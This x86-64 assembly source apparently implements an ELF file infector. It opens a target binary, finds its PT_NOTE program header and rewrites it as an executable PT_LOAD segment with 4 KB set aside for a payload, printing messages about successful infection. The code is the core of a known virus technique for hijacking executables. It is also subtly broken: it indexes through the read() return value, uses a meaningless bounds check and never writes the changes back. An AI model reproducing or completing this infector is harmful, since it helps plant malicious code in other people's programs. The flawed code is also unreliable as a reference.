section .data align=8
    file_open_error_msg db "Error opening file", 0xA  ; Error message
    file_open_error_len equ $ - file_open_error_msg
    infect_success_msg db "PT_NOTE segment successfully modified.", 0xA
    infect_success_len equ $ - infect_success_msg
    infect_error_msg db "PT_NOTE segment not found or error modifying.", 0xA
    infect_error_len equ $ - infect_error_msg
    read_error_msg db "Error reading ELF file", 0xA
    read_error_len equ $ - read_error_msg

section .bss
    stack_buffer resb 10000  ; Stack buffer for ELF data


section .text
global _start

_start:
    ; 1. Allocate stack buffer (r15 points to the buffer)
    lea r15, [stack_buffer]
    
    
    ; Get the file name from arguments (argv[1])
    mov rdi, [rsp + 8]          ; Address of argv[0]
    mov rdi, [rsp + 16]         ; Address of argv[1] (file name)

    ; Check if a file name was provided
    test rdi, rdi               ; Is argv[1] null?
    jz no_filename_error        ; If null, handle error

    ; Prepare arguments for open() syscall
    mov rax, 2                  ; Syscall number for open()
    mov rsi, 2                  ; O_RDWR (read/write access)
    xor rdx, rdx                ; Mode (not needed for this call)
    syscall                     ; Invoke syscall

    ; Check if file was successfully opened
    test rax, rax               ; Check if rax < 0
    js file_open_error          ; If negative, jump to error handler

    ; File successfully opened; rax holds the file descriptor
    
    
    ; We want to save the original entry point e_entry  :
    ; We allocate stack buffer (r15 points to the buffer)
    lea r15, [stack_buffer]

    ; Then wead ELF file contents into the stack buffer
    mov rdi, rax             ; File descriptor (from the open() syscall result)
    mov rsi, r15             ; Destination buffer (stack buffer)
    mov rdx, 10000           ; Number of bytes to read
    mov rax, 0               ; Syscall number for read()
    syscall
    
parse_phdr:
    xor rcx, rcx                       ; Zero rcx (iterator)
    xor rdx, rdx                       ; Zero rdx (entry size)
    
    ; Extract the Program Header Table offset (e_phoff) from ELF header
    mov rbx, [r15 + 32]          ; r15 + 32 -> e_phoff

    ; Extract the size of a PHT entry (e_phentsize)
    mov dx, word [r15 + 54]      ; r15 + 54 -> e_phentsize

    ; Extract the number of PHT entries (e_phnum)
    mov cx, word [r15 + 56]      ; r15 + 56 -> e_phnum
    
    ; Loop through Program Header Table
loop_phdr:
    cmp rcx, 0                         ; If no more headers, exit loop
    jz pt_note_not_found

    ; Check for out-of-bounds access
    cmp rbx, [r15 + 0x1000]            ; Ensure we're within the ELF file size
    jae pt_note_not_found

    ; Check if current segment is PT_NOTE
    cmp dword [r15 + rbx], 0x4         ; Compare p_type with 4 (PT_NOTE)
    je pt_note_found

    ; Move to next entry
    add rbx, rdx                       ; Increment PHT entry offset
    dec rcx                            ; Decrement number of entries
    jmp loop_phdr                      ; Repeat loop

pt_note_found:
    ; Modify PT_NOTE segment to PT_LOAD
    mov dword [rax + rbx], 0x1         ; Change p_type to PT_LOAD (value 1)
    or dword [rax + rbx + 4], 0x5      ; Set p_flags to RX (read and execute)

    ; Adjust other fields to create a valid PT_LOAD segment
    mov rdi, 0x7FFFFFFFF000            ; High memory virtual address for injection
    mov [rax + rbx + 16], rdi          ; Set p_vaddr to the high memory address
    mov [rax + rbx + 24], rdi          ; Set p_paddr (physical address)

    ; Increase file size and memory size of segment
    mov rdi, 0x1000                    ; 4 KB size for payload
    add qword [rax + rbx + 32], rdi    ; Add to p_filesz (size in file)
    add qword [rax + rbx + 40], rdi    ; Add to p_memsz (size in memory)

    ; Ensure alignment
    mov qword [rax + rbx + 48], 0x1000 ; Set p_align to 4 KB alignment

    ; Print success message
    mov rax, 1                         ; Syscall: write
    mov rdi, 1                         ; File descriptor: stdout
    lea rsi, [infect_success_msg]      ; Message to write
    mov rdx, infect_success_len        ; Message length
    syscall

    ; Exit successfully
    mov rax, 60                        ; Syscall: exit
    xor rdi, rdi                       ; Exit code: 0
    syscall

pt_note_not_found:
    ; Print error message if PT_NOTE was not found
    mov rax, 1                         ; Syscall: write
    mov rdi, 2                         ; File descriptor: stderr
    lea rsi, [infect_error_msg]        ; Message to write
    mov rdx, infect_error_len          ; Message length
    syscall
    
    
    
    
    ; Exit program
    mov rax, 60                 ; Exit syscall
    xor rdi, rdi                ; Exit code 0
    syscall

file_open_error:
    ; Handle file open error
    mov rax, 1                  ; Syscall number for write()
    mov rdi, 2                  ; File descriptor for stderr
    lea rsi, [file_open_error_msg]
    mov rdx, file_open_error_len
    syscall

    ; Exit program with error code
    mov rax, 60                 ; Exit syscall
    mov rdi, 1                  ; Exit code 1
    syscall

no_filename_error:
    ; Handle missing filename error
    mov rax, 1                  ; Syscall number for write()
    mov rdi, 2                  ; File descriptor for stderr
    lea rsi, [file_open_error_msg] ; Reuse the same error message
    mov rdx, file_open_error_len
    syscall
    
read_error:
    ; Handle read error
    mov rax, 1               ; Syscall number for write()
    mov rdi, 2               ; File descriptor for stderr
    lea rsi, [read_error_msg]
    mov rdx, read_error_len
    syscall
    
    
    ; Exit program with error code
    mov rax, 60                 ; Exit syscall
    mov rdi, 1                  ; Exit code 1
    syscall
